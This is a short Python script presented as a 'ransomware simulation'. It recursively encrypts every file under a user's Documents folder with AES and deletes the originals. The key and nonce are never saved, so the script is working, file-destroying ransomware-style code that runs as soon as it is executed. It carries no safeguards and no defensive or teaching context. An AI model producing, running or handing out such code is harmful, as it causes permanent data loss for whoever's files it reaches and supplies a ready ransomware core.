import os
import random
import string
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def get_files(directory):
    files = []
    for root, dirs, filenames in os.walk(directory):
        for filename in filenames:
            files.append(os.path.join(root, filename))
    return files

def encrypt_file(file_path, key):
    cipher = AES.new(key, AES.MODE_EAX)
    with open(file_path, 'rb') as file:
        data = file.read()
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return ciphertext, tag

def simulate_ransomware(directory):
    files = get_files(directory)
    key = get_random_bytes(16)
    for file_path in files:
        print(f'Encrypting {file_path}')
        ciphertext, tag = encrypt_file(file_path, key)
        with open(file_path + '.encrypted', 'wb') as encrypted_file:
            encrypted_file.write(ciphertext)
            encrypted_file.write(tag)
        os.remove(file_path)
    print('Ransomware simulation complete.')

directory = 'C:/Users/YourUsername/Documents'  # Replace with your directory
simulate_ransomware(directory)
